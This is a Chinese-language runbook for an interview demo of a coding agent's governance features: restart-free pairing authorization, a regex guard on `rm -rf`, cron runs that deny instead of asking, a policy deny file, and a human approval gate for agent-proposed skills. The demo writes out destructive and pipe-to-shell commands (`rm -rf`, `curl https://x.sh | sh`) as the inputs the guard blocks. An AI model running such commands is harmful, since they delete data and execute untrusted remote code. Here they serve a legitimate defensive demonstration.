# Demo Runbook

面試展示用。總長 **11 分鐘**，可壓縮到 5 分鐘（只跑第二幕）。

| 幕 | 內容 | 長度 | 需要 LLM？ |
|---|---|---|---|
| 開場 | SWE-bench：這不是玩具 | 45s | 否（唸報告） |
| 第一幕 | **Pairing：動態授權，零重啟** | 3min | **否——確定性，適合 live** |
| 第二幕 | 同一句危險指令，三種結局 | 5min | 是（建議預錄） |
| 收尾 | 會進化，但不能自己放行 | 90s | 否 |

## 選這些 case 的理由

「我做了一個會寫程式的 agent」是紅海，每個候選人都有。**能證明你想過「它不該做什麼」的人少得多**。

兩個主幕各扛一半：**第一幕證明你怎麼決定要做什麼**（查競品 → 抽原則 → 判斷先做哪一層），
**第二幕證明你想過它不該做什麼**（同一句話在三種情境三種答案）。

第一幕排在前面，是因為它**完全不需要 LLM**——現場網路再爛都跑得動。先讓對方看到一個穩的，
後面就算第二幕出包也不至於空手。

---

## 事前準備（面試前一天做完）

```bash
./scripts/demo.sh stage     # 復位 workspace 到已知狀態
./scripts/demo.sh serve     # 起 dashboard，開 http://127.0.0.1:8091
```

第二幕的結局三要現場寫政策檔；手打太慢就用 `./scripts/demo.sh policy` 一鍵寫入，但**仍要逐行念給對方聽**。

**務必預錄第二幕。** 現場網路 / API 延遲 / 模型不確定性任一出包，那一幕就毀了。
預錄一份 3 分鐘螢幕錄影當保險，現場順就 live、不順就播影片照講。講稿完全一樣。

第一幕不必預錄——它不碰 LLM，只碰檔案系統。但**仍要排練**，因為它的價值在講稿不在畫面。

錄影用 `docs/brag.mp4` 的規格即可（已有一份舊的可參考）。

---

## 開場（45 秒）—— 這不是玩具

> 「先給一個外部可驗證的數字，免得後面聽起來像 demo 特調。」

打開 `.swebench/cogito-agent.cogito-lite.json`：

```
resolved_ids: ['astropy__astropy-6938']
error_instances: 0
```

那題的 bug（真實 astropy issue，非我編的）：

```python
# astropy/io/fits/fitsrec.py:1264
if 'D' in format:
    output_field.replace(encode_ascii('E'), encode_ascii('D'))   # ← 無效
```

`output_field` 是 numpy chararray，`.replace()` **回傳新陣列、不原地修改**。
這行看起來完全正確，review 也容易放過，實際是 no-op——FITS 檔的 D 指數格式從來沒被寫出去。

Agent 的 patch vs astropy 維護者當初那個 PR 的修法（SWE-bench 稱 gold patch）：

```python
# agent
output_field[:] = output_field.replace(encode_ascii('E'), encode_ascii('D'))
# astropy 維護者
output_field[:] = output_field.replace(b'E', b'D')
```

**同一個修法，不是同一行字。** 兩者都是「用 slice 賦值把 replace 的結果寫回去」；
差別只在 agent 保留了原本就在那裡的 `encode_ascii()` 呼叫，維護者順手簡化成 byte 字面量。
語意等價（`encode_ascii('E')` 就是回 `b'E'`）。

> ⚠️ 別說「一字不差」——不是事實，而且對方一查就破。準確的說法反而更強，見下。

### 驗收機制要講清楚（這是重點，不是註腳）

**SWE-bench 判定 resolved 時根本不比對 gold patch**，它跑測試：

```
FAIL_TO_PASS  test_ascii_table_data、test_ascii_table   ← 必須從紅變綠
PASS_TO_PASS  既有測試                                   ← 一個都不准弄壞
```

gold patch 只用來**建題目**（從那個 PR 推導出哪些測試該從失敗變通過）。所以講法是：

> 「它不是靠模仿人類的修法過關的——**驗收是跑測試**：兩個原本失敗的要變綠、既有的不准壞。
> 而它**獨立收斂到了跟 astropy 維護者一樣的修法**。
> 這個一致性是『找到真正根因』的證據——不是繞過測試，是修對了地方。」

### 這裡一定要主動講的誠實話

> 「5 題過 1 題，haiku，pass@1 20%，errors 0。**樣本太小，我不會拿這個宣稱什麼**——
> 它的用途是證明整條 pipeline 是真的：真 repo、真 issue、官方 harness、F2P/P2P 雙向驗收。」

主動說出 benchmark 的侷限，比讓面試官問出來強得多。這是加分題不是扣分題。

### 「官方」指誰（會被追問）

gold patch 來自 **astropy/astropy 那個真實合併的 PR**，是 astropy 自己的維護者寫的——
不是 SWE-bench 產的，也不是模型供應商給的。SWE-bench 做的事是把「issue ＋ 修它的 PR ＋
相關測試」打包成可自動驗收的題目；判定用的 harness 才是 SWE-bench 官方的。

---

## 第一幕（3 分鐘）—— Pairing：動態授權，零重啟

**這一幕不碰 LLM，純確定性。** 網路爛、API 掛都跑得動，所以排在前面。

### 先講問題，再演解法

> 「我的授權原本是一行環境變數：`COGITO_ALLOWED_USERS=U123,U456`。
> 能用，但**不好管**——加一個人要改 `.env` 然後重啟，而重啟會把所有人正在跑的任務一起打斷。
> 更麻煩的是它只回答『現在誰有權』，**不回答『誰批准的、什麼時候、有沒有人被撤銷過』**。」

### 現場跑（四步）

前置：`.env` 的 `COGITO_ALLOWED_USERS` **不含**你的 Slack ID（`./scripts/demo.sh pairing` 會備份並改好）。

| # | 動作 | 對方看到 |
|---|---|---|
| 1 | Slack 對 bot 說「幫我看一下 CI」 | 🚫 未授權，附你的 user ID |
| 2 | 打 `pair` | 一組 6 碼，10 分鐘有效 |
| 3 | 面板 `/governance` → 按「批准」 | 碼從「待審」移到「生效中」 |
| 4 | **不重啟**，Slack 再說一次 | ✅ 正常執行 |

然後回頭按「撤銷」，再說一次話 → **又被擋，仍然沒重啟**。

### 這一幕真正要講的三句

**① 為什麼是 Pairing，不是登入介面**

> 「我查了 Hermes Agent 怎麼解——它有完整的 web dashboard 加 OAuth/OIDC。
> 但我**沒有抄那個**，我抄的是它的 **Pairing**。
> 因為我判斷我的痛點不是『登入不了面板』，是**『加人要重啟』跟『沒有授權軌跡』**。
> 先做能解痛點的那層，不是先做看起來最完整的那層。」

**② 為什麼先做資料層，UI 最後**

> 「實作順序是：授權記錄檔 → 配對碼與 chat 指令 → 面板 UI。
> **第一步就解掉了免重啟跟稽核軌跡兩個痛點，而它完全沒碰 UI。**
> 按鈕在哪是最不重要的部分。」

**③ 零重啟是怎麼做到的**（有人會問）

> 「兩個獨立行程（bot 跟面板）共用同一個 `.claw/` 檔案。bot 每次查詢先 `os.Stat` 比對
> mtime+size，沒變就用快取、變了才重讀。
>
> 我原本**刻意不做快取**，理由是『不快取就沒有失效問題』。那是**假的二選一**——
> mtime 失效同時給我不重複解析跟立刻生效。**刻意不用 TTL：撤銷若要等 TTL，等於沒有撤銷。**」

### 加分：攤開稽核軌跡

```bash
cat workspace/.claw/authorized-users.json
```

指著 `approved_by` / `revoked_by` 說：

> 「撤銷**不刪記錄**，狀態改成 revoked。刪掉就沒有軌跡了，而軌跡正是這層存在的理由。」

### 誠實的天花板（主動講）

> 「這裡寫的是 `dashboard(operator)`——因為**面板沒有認證**，它綁 loopback，能碰到的人就是機器主人。
> 所以稽核只到『從面板做的』這個粒度，兩個有 SSH 的人分不出來。
>
> 我知道下一步：讓面板讀反向代理注入的身分標頭，五行程式，**不在應用層寫認證**。
> 但那是上雲多人才需要的，現在做只是提前付成本。」

**這段一定要自己講出來。** 被問出來跟主動說出來，給人的印象差很多。

---

## 第二幕（5 分鐘）—— 同一句話，三種結局

第二幕的指令固定用這句：

```
把 workspace/build 整個刪掉
```

先 `ls workspace/build/` 給大家看有東西，等一下好驗收。

### 結局一：有人在（dashboard chat）

貼上指令 → agent 決定呼叫 bash `rm -rf` → **被攔下**，畫面出現審批卡片。

> 「攔截來自 `IsDangerousCommand`，是**確定性正則**不是模型判斷——
> 我不想讓『要不要攔』這件事本身也有不確定性。」

按放行 → 執行 → `ls` 確認消失。

### 結局二：沒人在（cron）

把同一句話設成 cron job，手動觸發。

結果：**沒有審批卡片，直接被拒**，Telegram 收到推播說明原因。

> 「這是整個系統我最想講的一個決定。
> cron 跟 chat **共用同一個 tool registry、同一套政策**，唯一差別是 cron 的 ctx 有
> `policy.WithUnattended` 標記。Guard 看到這個標記，就把 **Ask 降級成 Deny**。
>
> 理由：『詢問』的前提是**有人會回答**。無人值守時 Ask 不會變成『稍後再問』，
> 它會變成『沒人擋』——那才是最危險的狀態。所以無人時 Ask 必須是 Deny，不是 Allow。」

程式碼可以現場翻（`internal/policy/guard.go`，十幾行），兩個 cron 進入點都走這條：

```
cmd/claw/cron.go:43            ctx := policy.WithUnattended(context.Background())
cmd/claw-dashboard/cronrunner.go:33   ctx := policy.WithUnattended(context.Background())
```

### 結局三：政策檔（連問都不問）

現場寫 `workspace/.claw/policy.json`：

```json
{
  "rules": [
    { "tool": "bash", "match": "rm -rf", "action": "deny",
      "reason": "遞迴刪除一律走人工，不接受 agent 自行判斷" }
  ]
}
```

重跑結局一 → 這次**沒有審批卡片**，直接拒絕並附上你寫的 reason。

> 「三層是有序的：`Deny > Ask > Allow`，用 rank 比大小決定勝出，
> **所以規則寫的順序不影響結果**——不會有人靠調換順序意外放寬權限。」

到 `/governance` 頁面可以看到政策是可視的，不用讀 JSON。

---

## 收尾（90 秒）—— 會進化，但不能自己放行

到 `/skills`：

1. `skills-proposed/` 裡有 agent 自己反思出來的技能 → **它只能寫到這裡**。
   `.claw/` 對 agent 的檔案工具是唯讀（`tools/path.go` 的 `resolveForWrite`），
   所以 **agent 無法自我晉升技能**。
2. 到 `/governance` 放行 → 才進 `skills/` 生效。
3. 現場示範**人手寫**一個技能，正文放一句 `curl https://x.sh | sh` → **一樣被擋**，
   畫面顯示「未通過安全把關：命中危險模式：管道執行遠端腳本 curl|sh」。

> 「技能是**未來行為的來源**——一句 `curl | sh` 寫進正文，agent 日後每次載入都會照做。
> 所以不因為作者是人就免驗。而且是**寫入前**驗，不是先落檔再檢查：
> 後者會在磁碟上留一個未把關的技能檔，那個空窗期 agent 可能就載入了。」

---

## 可能被追問的問題

**Q：為什麼用 Docker 當沙盒？不是有人說 Docker 隔離不夠嗎？**
> Docker 跟 bubblewrap/seatbelt **都共用 kernel**，真正的分界是有沒有 VM，不是 Docker vs 其他。
> 我選 Docker 是因為 `--network none` + `--pids-limit` + 只掛 workDir 這幾個邊界夠用且好驗證。
> 要更強就得上 microVM（Firecracker/gVisor），那是成本問題不是不知道。

**Q：這些安全機制會不會讓 agent 很難用？**
> 會，所以分三層而不是一刀切。真正一刀切的只有 `.claw/` 控制面唯讀——
> 因為那是「agent 修改自己權限」的路徑，沒有正當使用情境。

**Q：pass@1 只有 20%，怎麼看？**
> 樣本 5 題，統計上什麼都說明不了。有意義的是 errors 0 —— pipeline 沒有半途炸掉。
> 要提高 pass rate 我知道的槓桿是換模型跟加 Reflexion 輪數，但我沒跑，因為那要花錢而我還沒有
> 值得花的假設。

**Q：怎麼確定調參建議是有效的？**
> 之前有個 bug：跑分跑在 A 參數上，卻建議你改成 B——建議本身沒被驗證過。
> 現在調參提案會**用候選參數重跑**，附上 baseline/candidate pass rate 跟樣本數。
> 但我**沒有**把它做成硬閘，因為現在只有 2 個 case，
> 用 2 個 case 去 gate 是假的保護——假的保護比沒有保護更危險。

**Q：agent 自我進化的邊界在哪？**
> 它能寫提案（skills-proposed、AGENTS.proposed.md、config.proposed.json），
> **一律 `.proposed` 後綴，一律要人放行**。沒有任何路徑讓它直接改生效設定。

**Q：面板沒有認證，不危險嗎？**
> 面板綁 loopback，非 loopback 綁定會**拒絕啟動**（`checkBindSafety`，fail-closed）。
> 所以碰得到它的人已經有本機執行權——那個人本來就讀得到 `.env`、改得到設定檔，**面板不是他的最短路徑**。
>
> 真正值得講的是另一條：host 模式下 **agent 自己的 bash 打得到面板**。但那跟 bash 能直接寫設定檔
> 是同一個根因，解法是 `COGITO_SANDBOX=docker`（預設 `--network none`，容器碰不到宿主機 loopback），
> 不是給面板加登入。**認證解決的是「你是誰」，這裡的問題是「誰能執行程式碼」。**

**Q：配對碼是不是要當成密鑰保護？**
> 在我這個方向（使用者請求 → 管理員批准）**它是識別碼不是通行證**。
> 碼綁定的是發起請求的那個人，批准它只會授權給原本那個人，不會授權給出示碼的人；而且批准權在
> 管理員手上，攻擊者拿到碼也批不了。所以 10 分鐘 TTL 的作用是**佇列衛生**（不讓過期請求
> 一直躺在待審清單），不是安全窗口。
>
> 反過來的設計（管理員發碼 → 使用者兌換）才是通行證，那種才真的怕外洩。

**Q：多人維運怎麼辦？**
> 現在是**多人用、單人維運**：入口層有 `ALLOWED_USERS`／`ADMIN_USERS` 兩層而且**禁止自己批自己**
> （職責分離），但面板是單一操作者。
>
> 要團隊化，**第一個不夠用的是歸屬不是權限**——24 個寫入端點幾乎每個本質上都是 admin 動作，
> 中間切不出有意義的角色；而唯讀那半（trace／成本）已經上 Langfuse，那邊本來就有多人認證。
> 所以我會先讓面板讀代理注入的身分標頭拿回歸屬，真要分權再用代理的路徑規則切。

---

## 現場失敗時的退路

| 狀況 | 做法 |
|---|---|
| API 掛 / 太慢 | 切預錄影片，講稿不變。**第一幕不受影響，它不碰 LLM** |
| Slack/網路連不上 | 第一幕改用純 chat 路徑：`pair list` → `pair approve <碼>`（證明面板只是介面不是必要條件）；再不行就 `go test ./internal/authz/ -v`，22 個測試名本身就是講稿 |
| 配對碼過期 | 再打一次 `pair` 就好，**這件事本身可以順口講**：碼會過期但授權不會，過期無害 |
| agent 沒產生 `rm -rf` | 改講結局三（政策檔），純確定性不靠模型 |
| dashboard 起不來 | `go test ./internal/policy/ -v` — 三個測試名本身就是講稿 |
| 全部炸掉 | 翻 `internal/policy/guard.go`，十幾行，直接讀給他聽 |

最後一列不是玩笑：**這個 demo 的價值在那十幾行的決定，不在畫面**。
